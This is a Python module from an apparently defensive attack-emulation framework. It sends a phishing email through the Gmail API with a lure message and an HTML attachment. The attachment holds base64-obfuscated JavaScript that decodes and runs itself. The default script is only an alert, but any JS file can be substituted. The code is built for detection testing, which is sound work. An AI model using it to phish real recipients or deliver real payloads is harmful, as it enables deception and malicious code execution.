#
# Licensed to Elasticsearch under one or more contributor
# license agreements. See the NOTICE file distributed with
# this work for additional information regarding copyright
# ownership. Elasticsearch licenses this file to you under
# the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
#

import base64
import io
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from googleapiclient.discovery import build

from swat.emulations.base_emulation import BaseEmulation


class Emulation(BaseEmulation):
    """
    Emulation that sends a phishing email with an HTML attachment with embedded javascript.
    Note that the HTML file should be downloaded and opened locally to execute the javascript.
    """

    parser = BaseEmulation.load_parser(description='Sends a phishing email to a user with a HTML attachment.')
    parser.add_argument('session_key', default='default', help='Session to use for service building API service')
    parser.add_argument('--recipient', required=True, help='Recipient email address')
    parser.add_argument('--sender', required=True, help='Sender email address')
    parser.add_argument('--subject', default='Phishing Test Email', help='Email subject')
    parser.add_argument('--attachment', default='swat_malicious', help='Attachment name')
    parser.add_argument('--js-file', help='Path to a file containing JS code. If not provided, default JS will be used.')

    techniques = ['T1566.001', 'T1204.002']
    name = 'Send HTML with Embedded Javascript with Gmail'
    scopes = ['gmail.send','gmail.readonly','gmail.compose']
    services = ['gmail']
    description = 'Sends a phishing email to a user with a HTML attachment with embedded javascript.'
    references = ['https://securelist.com/html-attachments-in-phishing-e-mails/106481/']

    def __init__(self, **kwargs) -> None:
        super().__init__(**kwargs)
        self.service = build('gmail', 'v1', credentials=self.obj.cred_store.store[self.args.session_key].session)

    def create_html(self) -> io.BytesIO:
        """Create an HTML file with embedded javascript."""

        # Load from external file if specified
        if self.args.js_file:
            with open(self.args.js_file, 'r') as f:
                js_content = f.read().strip()

        else:
            js_content = 'alert("Embedded JavaScript by SWAT!");'

        # Obfuscate JavaScript with Base64 encoding
        obfuscated_js = base64.b64encode(js_content.encode()).decode()

        # Add the decoding and execution method
        js_content = f"""
        <script>
            var decoded_js = atob('{obfuscated_js}');
            var script = document.createElement('script');
            script.innerHTML = decoded_js;
            document.body.appendChild(script);
        </script>
        """

        html_content = f'<html><head></head><body>{js_content}</body></html>'
        return io.BytesIO(bytes(html_content, 'utf-8'))

    def create_email(self, attachment: io.BytesIO) -> dict:
        """Create the email."""

        greeting = "Greetings,\n\n"
        content = "We're excited to share exclusive materials with you. \nPlease open the attached file for details.\n\n"
        farewell = "Best regards,\nSWAT Emulation Team\n\n"
        ps = "PS: This is a controlled emulation. Do not share or forward this email."

        body = greeting + content + farewell + ps
        message = MIMEMultipart()
        message['to'] = self.args.recipient
        message['from'] = self.args.sender
        message['subject'] = self.args.subject
        message.attach(MIMEText(body, 'plain'))

        # Decode the bytes to a string before passing to MIMEText
        html_attachment = MIMEText(attachment.getvalue().decode('utf-8'), 'html')
        html_attachment.add_header('Content-Disposition', 'attachment', filename=f'{self.args.attachment}.html')

        message.attach(html_attachment)
        self.elogger.info(f'Created email and attached HTML')
        return {'raw': base64.urlsafe_b64encode(message.as_bytes()).decode()}

    def send_email(self, email: dict) -> None:
        """Send the email."""

        try:
            self.service.users().messages().send(userId='me', body=email).execute()
            self.elogger.info(f'Sent email to {self.args.recipient} from {self.args.sender}')
            self.elogger.info(f'Email subject: {self.args.subject}')
        except Exception as e:
            self.elogger.error(f"Failed to send the email due to: {e}")

    def execute(self) -> None:
        """Execute the emulation."""

        self.elogger.info(self.exec_str(self.parser.description))
        try:
            html_attachment = self.create_html()
            email = self.create_email(html_attachment)
            self.send_email(email)
        except Exception as e:
            self.elogger.error(f"Error executing the emulation: {e}")
